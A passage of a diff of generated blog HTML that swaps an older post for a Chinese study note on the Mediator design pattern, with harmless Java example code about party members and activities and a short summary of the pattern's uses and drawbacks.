class="keyword">public</span> <span class="keyword">void</span> <span class="title">joinParty</span><span class="params">(Party party)</span> </span>&#123;</span><br><span class="line">    LOGGER.info(<span class="string">"&#123;&#125;加入了派对"</span>, <span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.party = party;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">act</span><span class="params">(Activity activity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> != activity) &#123;</span><br><span class="line">      LOGGER.info(<span class="string">"&#123;&#125;提议进行&#123;&#125;活动"</span>, <span class="keyword">this</span>, activity);</span><br><span class="line">      party.letAct(<span class="keyword">this</span>, activity);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">partyActivity</span><span class="params">(Activity activity)</span> </span>&#123;</span><br><span class="line">    LOGGER.info(<span class="string">"进行派对活动，名称：&#123;&#125;，介绍：&#123;&#125;"</span>, activity, activity.getDescription());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">toString</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>派对中提供的活动有射击、猜灯谜、桌游和唱歌，为其定义一个枚举类</p>
+<p>Activity.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Activity &#123;</span><br><span class="line">  SHOOT(<span class="string">"射击"</span>, <span class="string">"Shooting"</span>), GUESS(<span class="string">"猜灯谜"</span>, <span class="string">"Guess"</span>), DESKTOP_GAME(<span class="string">"桌游"</span>, <span class="string">"Desktop games"</span>), SING(<span class="string">"唱歌"</span>, <span class="string">"singing"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> String description;</span><br><span class="line"></span><br><span class="line">  Activity(String name, String description) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.description = description;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> description;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>有四种不同职业或特点的参与者，分别继承自 <code>AbstractPartyMember</code> 类，分别覆盖了父类中的 <code>toString()</code> 方法来表示其特征</p>
+<p>他们分别是 <code>Officer.java</code>,<code>Oldman.java</code>,<code>Student.java</code> 和 <code>Businessman.java</code>，此处省略具体代码</p>
+<p>现在来举办一次派对，参与者们分别向派对举办者提出活动请求，举办者分别批准</p>
+<p>App.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(Application.class);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//   派对举办者</span></span><br><span class="line">    Party party = <span class="keyword">new</span> PartyImpl();</span><br><span class="line">    <span class="comment">// 学生</span></span><br><span class="line">    Student student = <span class="keyword">new</span> Student();</span><br><span class="line">    <span class="comment">// 官员</span></span><br><span class="line">    Officer officer = <span class="keyword">new</span> Officer();</span><br><span class="line">    <span class="comment">// 商人</span></span><br><span class="line">    Businessman businessman = <span class="keyword">new</span> Businessman();</span><br><span class="line">    <span class="comment">// 老人</span></span><br><span class="line">    Oldman oldman = <span class="keyword">new</span> Oldman();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 邀请成员加入</span></span><br><span class="line">    party.addMember(student);</span><br><span class="line">    party.addMember(officer);</span><br><span class="line">    party.addMember(businessman);</span><br><span class="line">    party.addMember(oldman);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分别提出参加活动的请求</span></span><br><span class="line">    student.act(Activity.DESKTOP_GAME);</span><br><span class="line">    officer.act(Activity.GUESS);</span><br><span class="line">    businessman.act(Activity.SHOOT);</span><br><span class="line">    oldman.act(Activity.SING);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>需要使用中介者模式的场景是对象与对象之间存在大量的关联关系，这样下去会导致系统的结构变得复杂，一个对象的改动势必会影响到另一个与之关联的对象，，同时做出相应的改动，它们之间分别相互耦合，几乎形成了“网状”的结构，这对于复杂的系统是非常不利的。</p>
+<p>中介者模式可以将这种 “网状结构” 解耦形成 “星形结构”，最典型的应用实例就是 MVC 结构，其中的 C （控制器） 就担当了 V（视图）和 M（模型）之间的中介者。</p>
+<p>中介者模式的缺点是会使中介者对象异常复杂，降低了可维护性，所以应当尽量避免在对象间的职责划分比较难以界定的场景中使用。</p>
 
       
     </div>
@@ -588,7 +502,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://james.letec.top/2018/02/24/Python 第一个爬虫-教务系统信息收集/" title="Python 第一个爬虫-教务系统信息收集">https://james.letec.top/2018/02/24/Python 第一个爬虫-教务系统信息收集/</a>
+    <a href="https://james.letec.top/2018/05/13/设计模式学习笔记（13）中介者/" title="设计模式学习笔记（13）中介者">https://james.letec.top/2018/05/13/设计模式学习笔记（13）中介者/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -605,9 +519,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/爬虫/" rel="tag"># 爬虫</a>
+            <a href="/tags/Java/" rel="tag"># Java</a>
           
-            <a href="/tags/Python/" rel="tag"># Python</a>
+            <a href="/tags/设计模式/" rel="tag"># 设计模式</a>
           
         </div>
       
@@ -620,8 +534,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/02/17/Spring 应用中集成 Apache Shiro/" rel="next" title="Spring 应用中集成 Apache Shiro">
-                <i class="fa fa-chevron-left"></i> Spring 应用中集成 Apache Shiro
+              <a href="/2018/05/09/设计模式学习笔记（12）迭代器/" rel="next" title="设计模式学习笔记（12）迭代器">
+                <i class="fa fa-chevron-left"></i> 设计模式学习笔记（12）迭代器
               </a>
             
           </div>
@@ -629,10 +543,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/03/29/SpringMVC 解析之 DispatcherServlet/" rel="prev" title="SpringMVC 解析之 DispatcherServlet">
-                SpringMVC 解析之 DispatcherServlet <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -862,7 +772,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#初衷"><span class="nav-number">1.</span> <span class="nav-text">初衷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结果"><span class="nav-number">2.</span> <span class="nav-text">结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程"><span class="nav-number">3.</span> <span class="nav-text">过程</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实例"><span class="nav-number">1.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">2.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
